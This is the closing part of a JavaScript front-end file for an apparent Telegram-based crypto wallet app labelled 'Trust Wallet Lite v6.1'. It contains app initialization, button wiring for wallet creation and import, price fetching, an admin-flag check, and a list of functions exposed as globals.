        console.error("❌ Splash screen not found!");
        return;
    }
    
    try {
        await loadAdminId();
        
        document.querySelectorAll('.nav-item').forEach(btn => {
            btn.addEventListener('click', () => {
                const tab = btn.getAttribute('data-tab');
                if (tab === 'wallet') showWallet();
                else if (tab === 'referral') showAirdrop();
                else if (tab === 'twtpay') showTWTPay();
                else if (tab === 'settings') showSettings();
            });
        });
        
        const createBtn = document.getElementById('createWalletBtn');
        const importBtn = document.getElementById('importWalletBtn');
        const confirmImportBtn = document.getElementById('confirmImportBtn');
        
        if (createBtn) createBtn.onclick = createNewWallet;
        if (importBtn) importBtn.onclick = showImportModal;
        if (confirmImportBtn) confirmImportBtn.onclick = importWallet;
        
        await fetchLivePrices();
        
        const userId = getUserId();
        if (userId && localStorage.getItem(`user_${userId}`)) {
            userData = JSON.parse(localStorage.getItem(`user_${userId}`));
            isAdmin = (userId === adminId);
            showMainApp();
            updateUI();
        } else {
            showOnboarding();
        }
        
        // إخفاء شاشة التحميل
        hideSplashScreen();
        
        console.log("✅ App initialized successfully!");
        
    } catch (error) {
        console.error("❌ Initialization error:", error);
        showErrorAndRetry("Failed to initialize app. Please refresh.");
    }
});

// ====== 15. EXPOSE GLOBALS ======
window.showWallet = showWallet;
window.showAirdrop = showAirdrop;
window.showTWTPay = showTWTPay;
window.showSettings = showSettings;
window.showSendModal = showSendModal;
window.showReceiveModal = showReceiveModal;
window.showSwapModal = showSwapModal;
window.showDepositModal = showDepositModal;
window.showWithdrawModal = showWithdrawModal;
window.showHistory = showHistory;
window.showNotifications = showNotifications;
window.showAdminPanel = showAdminPanel;
window.closeModal = closeModal;
window.toggleLanguage = toggleLanguage;
window.toggleTheme = toggleTheme;
window.logout = logout;
window.createNewWallet = createNewWallet;
window.importWallet = importWallet;
window.showImportModal = showImportModal;
window.copyInviteLink = copyInviteLink;
window.claimMilestone = claimMilestone;
window.showTopUp = showTopUp;
window.showCardSettings = showCardSettings;
window.showCardTransactions = showCardTransactions;
window.sendTransaction = sendTransaction;
window.submitWithdraw = submitWithdraw;

console.log("✅ Trust Wallet Lite v6.1 - READY!");
console.log("📱 Telegram ID:", REAL_USER_ID);
console.log("👑 Is Admin:", isAdmin);
